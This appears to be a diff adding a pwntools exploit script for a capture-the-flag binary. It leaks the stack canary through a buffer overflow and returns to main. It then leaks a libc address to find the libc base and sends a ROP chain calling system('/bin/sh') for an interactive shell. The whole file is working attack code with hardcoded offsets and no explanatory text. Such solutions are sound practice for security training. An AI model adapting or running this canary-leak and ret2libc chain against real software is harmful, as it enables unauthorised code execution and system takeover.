@@ -1,0 +1,61 @@
+#!/usr/bin/env python3
+from pwn import *
+
+context.binary = './1'
+context.log_level = 'debug'
+
+p= process('./1')
+
+###Get canary
+p.recvuntil(b'Please enter your name >>')
+payload = b'A' * 0x148+b'@'
+p.send(payload)
+p.recvuntil(b"Your name")
+p.recvuntil(b"@")
+canary_leak = p.recv(7)  
+canary = u64(b'\x00' + canary_leak)
+print(f"Canary: 0x{canary:016x}")
+###
+
+###leak the libc addr at $rbp+0x8
+p.recvuntil(b"Please enter your content >>")
+
+pop_rdi=0x000000000002a3e5
+binsh=0x00000000001d8678
+system=0x0000000000050d70
+
+payload=b""
+payload = payload.ljust(0x108, b'B')
+payload+= p64(canary)
+payload+= p64(0)
+payload+= p64(0x000000000040101a)    ###ret对齐
+payload+= p64(0x401494)    ###ret2 main!
+p.send(payload)
+
+p.recvuntil(b"Please enter your name >>")
+payload = b'A' * 0x157+b'@'
+
+p.send(payload)
+p.recvuntil(b"Your name")
+p.recvuntil(b"@")
+
+leak = p.recv(6).ljust(8,b'\x00')
+
+libc = u64(leak)
+print(f"Libc: 0x{libc:016x}")
+
+libc_base=libc - 0x94ac3
+print(f"Libc: 0x{libc_base:016x}")
+
+# ###
+# ### Rop
+
+p.recvuntil(b"Please enter your content >>")
+
+payload= b'a'*(0x108)+p64(canary)+p64(0)+p64(0x000000000040101a)
+payload+= p64(libc_base+pop_rdi)
+payload+= p64(libc_base+binsh)
+payload+= p64(libc_base+system)
+p.sendline(payload)
+
+p.interactive()
